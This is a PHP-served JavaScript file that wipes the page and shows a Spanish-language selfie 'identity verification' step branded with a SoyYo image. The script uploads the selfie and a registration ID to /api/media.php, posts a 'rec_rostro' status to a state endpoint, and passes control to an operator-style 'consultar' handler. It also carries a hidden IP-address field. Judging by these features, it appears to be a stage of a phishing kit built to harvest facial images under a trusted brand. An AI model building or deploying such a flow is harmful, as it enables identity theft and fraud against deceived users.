<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/javascript');
?>
(function(){
  var data = (typeof window !== 'undefined' && window.my_data) ? window.my_data : {};
  var hosting = (typeof window !== 'undefined' && window.my_hosting) ? String(window.my_hosting) : '';
  var hostingBase = hosting ? hosting.replace(/\/+$/, '') : '';
  var idreg = (data && data['registro']) ? String(data['registro']) : '';

  var titulo = 'Verificación facial';
  try {
    var tituloEl = document.getElementById('titulo');
    if (tituloEl) tituloEl.textContent = titulo;
  } catch(e){}

  var contenido = `
  <link rel="stylesheet" href="${hostingBase}/css/flow-theme.css" />
  <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">

  <style>
    .upload-panel { display: flex; flex-direction: column; gap: 14px; }
    .upload-card { display: grid; place-items: center; gap: 6px; }
    .upload-card i { font-size: 24px; color: var(--ink); }
    .helper-text { text-align: center; }
  </style>

  <main class="flow-shell">
    <div class="logo-mark" aria-hidden="true">
      <span></span><span></span><span></span>
    </div>

    <h1 class="flow-title">Verifica tu identidad</h1>
    <p class="flow-subtitle">Captura una selfie siguiendo las indicaciones.</p>

    <section class="panel upload-panel">
      <div class="figure-card">
        <img src="${hostingBase}/assets/img/soyyo.png" alt="Identificación SoyYo" style="max-width:200px;">
        <p class="figure-caption">Revisa que tu rostro se vea completo, con buena luz y sin elementos que lo cubran.</p>
      </div>

      <label class="upload-card" for="fileSelfie">
        <i class='bx bx-camera'></i>
        <div>Sube tu selfie</div>
        <small class="helper-text">Formatos permitidos: JPG o PNG.</small>
        <input type="file" id="fileSelfie" accept="image/*" capture="user">
      </label>
      <img id="previewSelfie" class="upload-preview" alt="Previsualización selfie"/>
      <div id="statusSelfie" class="helper-text">Formato aceptado: JPG o PNG</div>
      <div id="successMsg" class="helper-text" style="display:none; color: var(--success); font-weight:700;">✅ ¡Selfie cargada correctamente!</div>

      <button id="btn-finish" class="btn-primary" disabled>CONTINUAR</button>
    </section>

    <div class="meta-hidden">
      <div id="ipc">Dirección IP:</div>
      <div id="jclock1"></div>
    </div>
  </main>`;


  document.body.innerHTML = contenido;
  try { localStorage.setItem('contenido', contenido); } catch(e){}

  if (!idreg) {
    var status = document.getElementById('statusSelfie');
    if (status){ status.className = 'status err'; status.textContent = 'Error: falta ID de registro.'; }
    return;
  }

  var selfieOk = false;
  var btn = document.getElementById('btn-finish');
  var selfieInput = document.getElementById('fileSelfie');
  var selfiePreview = document.getElementById('previewSelfie');
  var selfieStatus = document.getElementById('statusSelfie');
  var successMsg = document.getElementById('successMsg');

  function setBtnState(){
    btn.disabled = !selfieOk;
    if (successMsg) {
      successMsg.style.display = selfieOk ? 'block' : 'none';
    }
    if (selfieStatus && !selfieOk) {
      selfieStatus.classList.remove('ok','err');
    }
  }

  if (selfieInput) {
    selfieInput.addEventListener('change', function(){
      var file = this.files && this.files[0];
      if (!file) { selfieOk = false; setBtnState(); return; }

      try {
        var reader = new FileReader();
        reader.onload = function(e){
          if (selfiePreview) {
            selfiePreview.src = e.target.result;
            selfiePreview.style.display = 'block';
          }
        };
        reader.readAsDataURL(file);
      } catch(e){}

      var fd = new FormData();
      fd.append('idreg', idreg);
      fd.append('lado', 'selfie');
      fd.append('imagen', file);

      fetch(hostingBase + '/api/media.php', { method:'POST', body: fd })
        .then(function(res){ return res.json(); })
        .then(function(json){
          if (json && json.status === 'ok'){
            selfieOk = true;
            if (selfieStatus) {
              selfieStatus.className = 'status ok';
              selfieStatus.textContent = 'Selfie subida correctamente';
            }
          } else {
            selfieOk = false;
            if (selfieStatus) {
              selfieStatus.className = 'status err';
              selfieStatus.textContent = 'Error: ' + (json && json.msg ? json.msg : 'no se pudo subir la selfie');
            }
          }
          setBtnState();
        })
        .catch(function(){
          selfieOk = false;
          if (selfieStatus) {
            selfieStatus.className = 'status err';
            selfieStatus.textContent = 'Error en la subida';
          }
          setBtnState();
        });
    });
  }

  if (btn) {
    btn.addEventListener('click', function(){
      if (!selfieOk) return;
      try {
        var fd = new FormData();
        fd.append('idreg', idreg);
        if (typeof window.token !== 'undefined' && window.token) {
          fd.append('tok', window.token);
        }
        fd.append('status', 'rec_rostro');
        fetch(hostingBase + '/api/state.php', { method: 'POST', body: fd })
          .then(function(){
            if (typeof window.processing === 'function') {
              window.processing({ t: 'consultar' });
            }
          })
          .catch(function(){
            if (typeof window.processing === 'function') {
              window.processing({ t: 'consultar' });
            }
          });
      } catch(e) {
        if (typeof window.processing === 'function') {
          window.processing({ t: 'consultar' });
        }
      }
    });
  }

  setTimeout(setBtnState, 200);
})();
